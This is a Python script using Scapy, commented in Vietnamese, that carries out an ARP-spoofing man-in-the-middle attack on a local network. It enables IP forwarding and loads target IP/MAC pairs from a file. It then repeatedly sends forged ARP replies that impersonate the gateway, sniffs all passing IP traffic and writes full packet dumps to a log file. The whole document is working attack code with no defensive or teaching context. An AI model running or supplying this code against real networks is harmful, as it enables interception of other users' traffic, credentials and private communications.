from scapy.all import *
import time
import os
import sys

# Địa chỉ MAC của máy nguồn
SRC_MAC = "E0:2B:E9:94:F2:D7"  # Địa chỉ MAC của máy bạn

# Địa chỉ IP của gateway
GATEWAY_IP = "10.10.22.1"

# Đọc danh sách mục tiêu từ file
def load_targets(filename):
    """
    Đọc danh sách mục tiêu từ file text.
    Mỗi dòng trong file có định dạng: IP MAC
    """
    targets = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                parts = line.strip().split()  # Tách dòng thành danh sách [IP, MAC]
                if len(parts) == 2:  # Đảm bảo đúng định dạng
                    targets.append((parts[0], parts[1]))  # Thêm (IP, MAC) vào danh sách
    except FileNotFoundError:
        print(f"Lỗi: Không tìm thấy file {filename}.")
        sys.exit(1)
    return targets

# ARP Spoofing - Gửi gói ARP giả mạo đến một mục tiêu
def arp_spoof(target_ip, target_mac, gateway_ip):
    """
    Gửi gói ARP giả mạo đến mục tiêu với địa chỉ MAC giả mạo của gateway.
    """
    arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=SRC_MAC)
    send(arp_response, verbose=False)
    print(f"ARP Spoofing: Gửi gói ARP giả mạo tới {target_ip} ({target_mac}) với địa chỉ MAC của gateway {gateway_ip}.")

# Gửi gói ARP Spoofing liên tục đến tất cả mục tiêu
def arp_spoof_all(targets, gateway_ip):
    """
    Gửi gói ARP giả mạo liên tục đến tất cả mục tiêu.
    """
    while True:
        for target_ip, target_mac in targets:
            arp_spoof(target_ip, target_mac, gateway_ip)
        time.sleep(2)  # Gửi gói ARP mỗi 2 giây

# Hàm đọc và lưu gói tin vào file
def packet_callback(packet):
    """
    Hàm xử lý khi nhận được gói tin và lưu vào file.
    """
    try:
        with open("data.txt", "a", encoding="utf-8") as file:  # Mở file với encoding UTF-8
            file.write(f"Gói tin nhận được: {packet.summary()}\n")
            if IP in packet:
                file.write(f"Thông tin chi tiết gói tin: {packet.show(dump=True)}\n")
    except Exception as e:
        print(f"Lỗi khi lưu gói tin: {e}")

# Main function
if __name__ == "__main__":
    # Bật tính năng IP forwarding trên hệ thống
    os.system("sysctl -w net.ipv4.ip_forward=1")  # Linux command to enable IP forwarding

    # Đọc danh sách mục tiêu từ file
    target_file = "targets.txt"
    TARGETS = load_targets(target_file)

    # Chạy ARP Spoofing liên tục trong một luồng riêng
    from threading import Thread
    spoof_thread = Thread(target=arp_spoof_all, args=(TARGETS, GATEWAY_IP))
    spoof_thread.daemon = True
    spoof_thread.start()

    # Bắt gói tin và gọi callback function để xử lý
    print("Đang bắt gói tin...")
    sniff(filter="ip", prn=packet_callback, store=0)  # Gọi packet_callback khi nhận được gói tin
